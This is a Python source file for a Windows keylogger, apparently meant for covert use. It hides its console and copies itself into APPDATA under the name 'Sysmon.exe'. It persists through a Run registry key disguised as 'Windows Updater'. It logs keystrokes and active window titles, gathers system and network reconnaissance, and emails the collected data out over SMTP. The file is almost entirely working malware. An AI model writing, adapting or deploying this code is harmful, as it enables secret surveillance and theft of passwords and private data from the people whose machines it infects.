import win32gui as wg
import win32console as wc
import pynput.keyboard
import threading as thread5
import time 
import sys,os
import shutil
from smtplib import SMTP
import email.message

currentkey = ''
logdata = ''
timereport = time.ctime()
firstreport = 0

def sendmailg(gserver , gport ,guser, gpass , mailfrom , mailto , subject , msg , ishtml = 0):
	mailmsg = email.message.Message()
	mailmsg['From'] = mailfrom
	mailmsg['To'] = mailto
	mailmsg['Subject'] = subject

	if ishtml == 1:
		mailmsg.add_header('Content-Type','text/html')
	else:
		mailmsg.add_header('Content-Type','text/plain')

	mailmsg.set_payload (msg, 'utf-8')
	with SMTP(gserver , gport)  as smtp:
		smtp.ehlo()
		smtp.starttls()
		smtp.login(guser, gpass)
		smtp.sendmail(mailfrom, mailto,mailmsg.as_string())
		smtp.quit()

def startup():
	dirapp = os.path.expanduser(os.getenv("APPDATA")) + "\\Sysmon.exe"
	if not os.path.exists(dirapp): 
		shutil.copy2(sys.argv[0] , dirapp);
	
	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater"').read()
	if regquery.find(dirapp) < 0:
		os.popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater" /t REG_SZ /d "cmd.exe /c ' + dirapp + '"')
		#os.popen("cmd.exe /c " + dirapp)

def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
	global logdata,timereport,interval,firstreport
	if firstreport == 0 :
		logdata = os.popen('systeminfo & whoami & net view').read()
		firstreport = 1
	timereport = time.ctime()
	while True:
		#print(logdata)
		if len(logdata) > 30 :
			msg = logdata
			logdata = ''
			sendmailg(gserver , gport , guser, gpass , mailfrom , mailto , subject ,msg , 0)
		time.sleep(60 * interval)

def onpressevent(key):
	global currentkey
	global logdata
	try :
		logdata = logdata + key.char
	except AttributeError :
		logdata = logdata + " " + str(key) + " "

def Checkifwindowchanged():
	global logdata
	if sys.platform in ['Windows' , 'win32']:
		cwindow = 'none'
		while True:
			activewindow = wg.GetWindowText(wg.GetForegroundWindow())
			if cwindow != activewindow :
				cwindow = activewindow
				logdata = logdata + '\n' + cwindow + time.ctime() + '\n'
 
def startkeylogger():  
	kbdlisten = pynput.keyboard.Listener(on_press=onpressevent)
	with kbdlisten :
		kbdlisten.join()

def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto,subject):
	wg.ShowWindow(wc.GetConsoleWindow(),0);
	startup()
	wtthread = thread5.Thread(target=Checkifwindowchanged)
	kthread = thread5.Thread(target=startkeylogger)
	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto, subject))
	kthread.start()
	wtthread.start()
	mailthread.start()
	kthread.join()
	wtthread.join()
	mailthread.join()
